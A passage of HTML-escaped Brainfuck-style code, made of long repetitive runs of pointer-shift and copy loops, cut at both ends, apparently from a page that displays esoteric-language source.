t;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;]&lt;[-&gt;+&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;]&lt;[-&gt;+&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&g